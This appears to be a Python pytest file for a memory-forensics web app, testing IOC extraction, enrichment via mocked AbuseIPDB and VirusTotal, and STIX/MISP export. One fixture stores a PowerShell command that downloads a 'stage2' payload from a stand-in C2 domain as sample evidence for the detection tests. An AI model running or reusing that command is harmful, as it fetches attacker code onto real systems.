import json
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from django.conf import settings
from django.urls import reverse
from guardian.shortcuts import assign_perm

from orochi.website.defaults import (
    RESULT_STATUS_SUCCESS,
    SERVICE_ABUSEIPDB,
    SERVICE_MISP,
    SERVICE_VIRUSTOTAL,
)
from orochi.website.ioc import (
    clean_address,
    enrich_ioc,
    export_iocs_to_misp,
    export_iocs_to_stix,
    extract_dump_iocs,
    is_public_ip,
)
from orochi.website.models import DumpIOC, Plugin, Result, Service, Value

pytestmark = pytest.mark.django_db


# =====================================================================
# 1. Unit Tests for Utility Functions
# =====================================================================
def test_is_public_ip():
    """Verify IP classification for threat intel extraction."""
    # Public IPs
    assert is_public_ip("8.8.8.8") is True
    assert is_public_ip("1.1.1.1") is True
    assert is_public_ip("93.184.216.34") is True
    assert is_public_ip("2001:4860:4860::8888") is True

    # Private / RFC 1918
    assert is_public_ip("10.0.0.1") is False
    assert is_public_ip("172.16.0.1") is False
    assert is_public_ip("172.31.255.255") is False
    assert is_public_ip("192.168.1.1") is False

    # Reserved / Documentation (RFC 5737)
    assert is_public_ip("198.51.100.25") is False
    assert is_public_ip("203.0.113.5") is False

    # Loopback
    assert is_public_ip("127.0.0.1") is False
    assert is_public_ip("127.0.0.53") is False
    assert is_public_ip("::1") is False

    # Link-local & Wildcard
    assert is_public_ip("169.254.1.1") is False
    assert is_public_ip("0.0.0.0") is False
    assert is_public_ip("255.255.255.255") is False
    assert is_public_ip("fe80::1") is False

    # Invalid
    assert is_public_ip("not-an-ip") is False
    assert is_public_ip("") is False
    assert is_public_ip(None) is False
    assert is_public_ip("999.999.999.999") is False


def test_clean_address():
    """Verify address stripping of ports and brackets."""
    assert clean_address("8.8.8.8:53") == ("8.8.8.8", 53)
    assert clean_address("1.1.1.1:443") == ("1.1.1.1", 443)
    assert clean_address("[2001:db8::1]:80") == ("2001:db8::1", 80)
    assert clean_address("8.8.4.4") == ("8.8.4.4", None)
    assert clean_address("") == (None, None)
    assert clean_address(None) == (None, None)


# =====================================================================
# 2. Automated IOC Extraction from Plugin Results
# =====================================================================
def test_extract_dump_iocs(dump):
    """Test extracting IPs, hashes, YARA hits, domains, and URLs from plugin data."""
    # 1. NetScan plugin with foreign public & private IPs
    p_netscan, _ = Plugin.objects.get_or_create(name="windows.netscan.NetScan")
    r_netscan = Result.objects.create(dump=dump, plugin=p_netscan, result=RESULT_STATUS_SUCCESS)
    Value.objects.create(
        result=r_netscan,
        value={
            "PID": 1234,
            "ForeignAddr": "93.184.216.34:443",
            "LocalAddr": "192.168.1.100:49152",
            "State": "ESTABLISHED",
        },
    )
    # Private IP in netscan - should be skipped
    Value.objects.create(
        result=r_netscan,
        value={
            "PID": 1234,
            "ForeignAddr": "10.0.0.5:80",
            "LocalAddr": "192.168.1.100:49153",
            "State": "ESTABLISHED",
        },
    )

    # 2. Dumpfiles plugin with file hash
    p_dumpfiles, _ = Plugin.objects.get_or_create(name="windows.dumpfiles.DumpFiles")
    r_dumpfiles = Result.objects.create(dump=dump, plugin=p_dumpfiles, result=RESULT_STATUS_SUCCESS)
    Value.objects.create(
        result=r_dumpfiles,
        value={
            "FileName": r"C:\Windows\Temp\mimikatz.exe",
            "Result": "Success",
            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "md5": "d41d8cd98f00b204e9800998ecf8427e",
        },
    )

    # 3. VadYaraScan with rule
    p_yara, _ = Plugin.objects.get_or_create(name="windows.vadyarascan.VadYaraScan")
    r_yara = Result.objects.create(dump=dump, plugin=p_yara, result=RESULT_STATUS_SUCCESS)
    Value.objects.create(
        result=r_yara,
        value={
            "PID": 1234,
            "Rule": "apt29_cozybear_loader",
            "Offset": "0x7ffb12340000",
        },
    )

    # 4. CmdLine with domain and URL
    p_cmdline, _ = Plugin.objects.get_or_create(name="windows.cmdline.CmdLine")
    r_cmdline = Result.objects.create(dump=dump, plugin=p_cmdline, result=RESULT_STATUS_SUCCESS)
    Value.objects.create(
        result=r_cmdline,
        value={
            "PID": 5678,
            "Process": "powershell.exe",
            "CommandLine": "powershell -c curl http://c2.malicious-domain.com/stage2.bin",
        },
    )

    created_iocs = extract_dump_iocs(dump)
    assert len(created_iocs) >= 4

    types = {ioc.ioc_type for ioc in created_iocs}
    assert "ip" in types
    assert "hash_sha256" in types
    assert "yara" in types

    ip_ioc = DumpIOC.objects.get(dump=dump, ioc_type="ip", value="93.184.216.34")
    assert ip_ioc.source_plugin == "windows.netscan.NetScan"
    assert ip_ioc.context["pid"] == 1234

    sha256_ioc = DumpIOC.objects.get(
        dump=dump,
        ioc_type="hash_sha256",
        value="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    )
    assert "mimikatz" in sha256_ioc.context.get("filename", "")

    yara_ioc = DumpIOC.objects.get(dump=dump, ioc_type="yara", value="apt29_cozybear_loader")
    assert yara_ioc.threat_score >= 80

    # Idempotent re-run should not create duplicates
    second_run = extract_dump_iocs(dump)
    assert len(second_run) == len(created_iocs)
    assert DumpIOC.objects.filter(dump=dump).count() == len(created_iocs)


# =====================================================================
# 3. IOC Enrichment Engine
# =====================================================================
def test_enrich_ioc_abuseipdb(dump):
    """Test enriching IP indicator with mocked AbuseIPDB service."""
    Service.objects.create(
        name=SERVICE_ABUSEIPDB,
        url="https://api.abuseipdb.com/api/v2/check",
        key="test-abuse-key",
    )

    ioc = DumpIOC.objects.create(
        dump=dump,
        ioc_type="ip",
        value="93.184.216.34",
        source_plugin="windows.netscan.NetScan",
    )

    fake_abuse_resp = MagicMock()
    fake_abuse_resp.status_code = 200
    fake_abuse_resp.json.return_value = {
        "data": {
            "abuseConfidenceScore": 95,
            "totalReports": 42,
            "countryCode": "RU",
            "usageType": "Data Center/Web Hosting/Transit",
            "isp": "Evil Hosting Ltd",
        }
    }

    with patch("requests.get", return_value=fake_abuse_resp):
        res = enrich_ioc(ioc)
        assert "abuseipdb" in res
        ioc.refresh_from_db()
        assert ioc.threat_score == 95
        assert ioc.is_malicious is True
        assert "abuseipdb" in ioc.enrichment
        assert ioc.enrichment["abuseipdb"]["abuse_score"] == 95


def test_enrich_ioc_virustotal(dump):
    """Test enriching Hash indicator with mocked VirusTotal service."""
    Service.objects.create(
        name=SERVICE_VIRUSTOTAL,
        url="https://www.virustotal.com/api/v3",
        key="test-vt-key",
    )

    ioc = DumpIOC.objects.create(
        dump=dump,
        ioc_type="hash_sha256",
        value="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        source_plugin="windows.dumpfiles.DumpFiles",
    )

    fake_vt_resp = MagicMock()
    fake_vt_resp.status_code = 200
    fake_vt_resp.json.return_value = {
        "data": {
            "attributes": {
                "last_analysis_stats": {
                    "malicious": 45,
                    "suspicious": 3,
                    "undetected": 20,
                    "harmless": 0,
                },
                "meaningful_name": "mimikatz.exe",
            }
        }
    }

    with patch("requests.get", return_value=fake_vt_resp):
        res = enrich_ioc(ioc)
        assert "virustotal" in res
        ioc.refresh_from_db()
        assert ioc.threat_score >= 60
        assert ioc.is_malicious is True
        assert "virustotal" in ioc.enrichment
        assert ioc.enrichment["virustotal"]["positives"] == 48


# =====================================================================
# 4. MISP & STIX Export
# =====================================================================
def test_export_iocs_to_stix(dump):
    """Verify STIX 2.1 JSON bundle generation."""
    DumpIOC.objects.create(
        dump=dump,
        ioc_type="ip",
        value="93.184.216.34",
        source_plugin="windows.netscan.NetScan",
    )
    DumpIOC.objects.create(
        dump=dump,
        ioc_type="domain",
        value="c2.evil.com",
        source_plugin="windows.cmdline.CmdLine",
    )

    iocs = list(dump.iocs.all())
    stix_bundle = export_iocs_to_stix(dump, iocs)

    assert stix_bundle["type"] == "bundle"
    assert stix_bundle["id"].startswith("bundle--")
    objects = stix_bundle["objects"]
    assert len(objects) >= 3  # Identity + at least 2 indicators

    indicators = [obj for obj in objects if obj["type"] == "indicator"]
    assert len(indicators) == 2
    patterns = [ind["pattern"] for ind in indicators]
    assert "[ipv4-addr:value = '93.184.216.34']" in patterns
    assert "[domain-name:value = 'c2.evil.com']" in patterns


def test_export_iocs_to_misp(dump, admin):
    """Verify MISP event creation with indicators as attributes."""
    Service.objects.create(
        name=SERVICE_MISP,
        url="https://misp.example.com",
        key="test-misp-key",
    )

    ioc_ip = DumpIOC.objects.create(
        dump=dump,
        ioc_type="ip",
        value="93.184.216.34",
        source_plugin="windows.netscan.NetScan",
        is_malicious=True,
    )
    ioc_hash = DumpIOC.objects.create(
        dump=dump,
        ioc_type="hash_sha256",
        value="1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
        source_plugin="windows.dumpfiles.DumpFiles",
    )

    mock_misp = MagicMock()
    mock_event = MagicMock()
    mock_event.id = 789
    mock_misp.add_event.return_value = mock_event

    with patch("orochi.website.ioc.PyMISP", return_value=mock_misp):
        res = export_iocs_to_misp(dump, [ioc_ip, ioc_hash], admin)
        assert res["success"] is True
        assert res["event_id"] == 789
        assert res["exported_count"] == 2
        mock_misp.add_event.assert_called_once()
        passed_event = mock_misp.add_event.call_args[0][0]
        assert len(passed_event.attributes) == 2


# =====================================================================
# 5. MISP Export Fix (Regression #1547 & Views)
# =====================================================================
def test_misp_export_view_missing_file(client, admin, dump):
    """Test export view returns 400 with helpful JSON error when file is missing on disk."""
    client.force_login(admin)
    assign_perm("website.can_see", admin, dump)

    Plugin.objects.get_or_create(name="windows.dumpfiles")

    Service.objects.create(
        name=SERVICE_MISP,
        url="https://misp.example.com",
        key="test-key",
    )

    # Path to non-existent file
    url = reverse("website:export")
    res = client.get(
        url,
        {
            "path": f"{settings.MEDIA_ROOT}/{dump.index}/windows.dumpfiles/nonexistent.exe",
            "dump": dump.index,
            "plugin": "windows.dumpfiles",
        },
    )
    assert res.status_code == 400
    data = res.json()
    assert "file not found on disk" in data["detail"].lower()


def test_misp_export_view_arbitrary_depth_path(client, admin, dump, tmp_path):
    """Test export view gracefully handles arbitrary MEDIA_ROOT path depth (Fix #1547)."""
    client.force_login(admin)
    assign_perm("website.can_see", admin, dump)

    Plugin.objects.get_or_create(name="windows.dumpfiles")

    Service.objects.create(
        name=SERVICE_MISP,
        url="https://misp.example.com",
        key="test-key",
    )

    # Create nested directories inside MEDIA_ROOT
    deep_dir = Path(settings.MEDIA_ROOT) / "a" / "b" / "c" / dump.index / "windows.dumpfiles"
    deep_dir.mkdir(parents=True, exist_ok=True)
    target_file = deep_dir / "target.dmp"
    target_file.write_bytes(b"DUMPFILE_BINARY_CONTENT_HERE")

    mock_misp = MagicMock()
    mock_misp.add_event.return_value = {"Event": {"id": 100}}

    with patch("orochi.website.views.PyMISP", return_value=mock_misp):
        url = reverse("website:export")
        res = client.get(
            url,
            {
                "path": str(target_file),
                "dump": dump.index,
                "plugin": "windows.dumpfiles",
            },
        )
        assert res.status_code == 200
        data = res.json()
        assert data["success"] is True
        assert "MISP export successful" in data["message"]


# =====================================================================
# 6. IOC Extraction Hub UI Views & Actions
# =====================================================================
def test_dump_iocs_views(client, admin, dump):
    """Test dump_iocs view renders full and partial template."""
    client.force_login(admin)
    assign_perm("website.can_see", admin, dump)

    DumpIOC.objects.create(
        dump=dump,
        ioc_type="ip",
        value="93.184.216.34",
        source_plugin="windows.netscan.NetScan",
        threat_score=85,
        is_malicious=True,
    )

    url = reverse("website:dump_iocs", kwargs={"index": dump.index})

    # Standard GET (full page with full URL)
    res = client.get(url)
    assert res.status_code == 200
    html = res.content.decode()
    assert "Threat Intel &amp; IOC Extraction Hub" in html or "IOC Hub" in html
    assert "93.184.216.34" in html
    assert 'id="dump-iocs-container"' in html

    # HTMX / Modal GET
    res_modal = client.get(url, HTTP_HX_REQUEST="true")
    assert res_modal.status_code == 200
    html_modal = res_modal.content.decode()
    assert "93.184.216.34" in html_modal
    assert 'id="dump-iocs-container"' in html_modal
    assert "Open Full Page" in html_modal

    # HTMX POST (red button re-extraction)
    with patch("orochi.website.views.extract_dump_iocs") as mock_extract:
        res_post = client.post(url, HTTP_HX_REQUEST="true")
        assert res_post.status_code == 200
        mock_extract.assert_called_once_with(dump)
        assert 'id="dump-iocs-container"' in res_post.content.decode()


def test_ioc_enrich_views(client, admin, dump):
    """Test ioc_enrich and ioc_enrich_all endpoints."""
    client.force_login(admin)
    assign_perm("website.can_see", admin, dump)

    ioc = DumpIOC.objects.create(
        dump=dump,
        ioc_type="ip",
        value="93.184.216.34",
        source_plugin="windows.netscan.NetScan",
    )

    url = reverse("website:ioc_enrich", kwargs={"index": dump.index, "ioc_id": ioc.pk})

    def fake_enrich(target_ioc):
        target_ioc.threat_score = 75
        target_ioc.is_malicious = True
        target_ioc.save()
        return {"abuseipdb": {"abuse_score": 75}}

    with patch("orochi.website.views.enrich_ioc", side_effect=fake_enrich):
        res = client.post(url)
        assert res.status_code == 200
        data = res.json()
        assert data["success"] is True
        assert data["threat_score"] == 75

    url_all = reverse("website:ioc_enrich_all", kwargs={"index": dump.index})
    with patch("orochi.website.views.enrich_ioc", side_effect=fake_enrich):
        res_all = client.post(url_all)
        assert res_all.status_code == 200
        data_all = res_all.json()
        assert data_all["count"] == 1


def test_ioc_export_file_view(client, admin, dump):
    """Test downloading IOCs as STIX JSON, CSV, and plain JSON."""
    client.force_login(admin)
    assign_perm("website.can_see", admin, dump)

    DumpIOC.objects.create(
        dump=dump,
        ioc_type="domain",
        value="suspicious-domain.org",
        source_plugin="windows.cmdline.CmdLine",
    )

    url = reverse("website:ioc_export_file", kwargs={"index": dump.index})

    # JSON export
    res_json = client.get(f"{url}?format=json")
    assert res_json.status_code == 200
    assert res_json["Content-Type"] == "application/json"
    data = json.loads(res_json.content)
    assert len(data) == 1
    assert data[0]["value"] == "suspicious-domain.org"

    # CSV export
    res_csv = client.get(f"{url}?format=csv")
    assert res_csv.status_code == 200
    assert "text/csv" in res_csv["Content-Type"]
    csv_text = res_csv.content.decode()
    assert "suspicious-domain.org" in csv_text
    assert "IOC Type" in csv_text

    # STIX export
    res_stix = client.get(f"{url}?format=stix")
    assert res_stix.status_code == 200
    stix_data = json.loads(res_stix.content)
    assert stix_data["type"] == "bundle"


def test_ioc_export_misp_view(client, admin, dump):
    """Test ioc_export_misp view exports selected indicators."""
    client.force_login(admin)
    assign_perm("website.can_see", admin, dump)

    ioc = DumpIOC.objects.create(
        dump=dump,
        ioc_type="ip",
        value="93.184.216.34",
        source_plugin="windows.netscan.NetScan",
    )

    url = reverse("website:ioc_export_misp", kwargs={"index": dump.index})

    with patch(
        "orochi.website.views.export_iocs_to_misp",
        return_value={"success": True, "event_id": 999, "exported_count": 1},
    ):
        res = client.post(
            url,
            data={"ioc_ids": [str(ioc.pk)]},
        )
        assert res.status_code == 200
        data = res.json()
        assert data["success"] is True
        assert data["event_id"] == 999


def test_test_service_connection(client, admin):
    """Test testing service connection utility."""
    client.force_login(admin)

    # Test MISP service connection
    service = Service.objects.create(
        name=SERVICE_MISP,
        url="https://misp.example.com",
        key="test-key",
    )

    url = reverse("website:test_service_connection")

    mock_misp = MagicMock()
    mock_misp.misp_instance_version = {"version": "2.4.190"}

    with patch("orochi.website.views.PyMISP", return_value=mock_misp):
        res = client.post(url, {"service": str(service.name)})
        assert res.status_code == 200, res.json()
        data = res.json()
        assert data["success"] is True
        assert "2.4.190" in data["message"]


# =====================================================================
# 7. REST API Endpoints
# =====================================================================
def test_api_dump_iocs_endpoints(client, admin, dump):
    """Test Ninja API router endpoints for IOC extraction and retrieval."""
    client.force_login(admin)
    assign_perm("website.can_see", admin, dump)

    # Populate dump with netscan
    p_netscan, _ = Plugin.objects.get_or_create(name="windows.netscan.NetScan")
    r_netscan = Result.objects.create(dump=dump, plugin=p_netscan, result=RESULT_STATUS_SUCCESS)
    Value.objects.create(
        result=r_netscan,
        value={
            "PID": 999,
            "ForeignAddr": "93.184.216.34:8080",
            "LocalAddr": "192.168.1.50:50000",
            "State": "ESTABLISHED",
        },
    )

    # 1. Trigger scan via API
    res_scan = client.post(f"/api/dumps/{dump.index}/iocs/scan")
    assert res_scan.status_code == 200, res_scan.json()
    data_scan = res_scan.json()
    assert data_scan["total_count"] >= 1
    assert data_scan["iocs"][0]["value"] == "93.184.216.34"

    # 2. Query IOCs via API
    res_get = client.get(f"/api/dumps/{dump.index}/iocs")
    assert res_get.status_code == 200
    data_get = res_get.json()
    assert data_get["total_count"] >= 1
    assert data_get["iocs"][0]["ioc_type"] == "ip"

    # 3. Export to MISP via API
    with patch(
        "orochi.website.ioc.export_iocs_to_misp",
        return_value={
            "success": True,
            "message": "Exported to MISP",
            "event_id": 555,
            "exported_count": 1,
        },
    ):
        res_misp = client.post(
            f"/api/dumps/{dump.index}/export-misp",
            data=json.dumps({"ioc_ids": [data_get["iocs"][0]["id"]]}),
            content_type="application/json",
        )
        assert res_misp.status_code == 200
        data_misp = res_misp.json()
        assert data_misp["success"] is True
        assert data_misp["event_id"] == 555
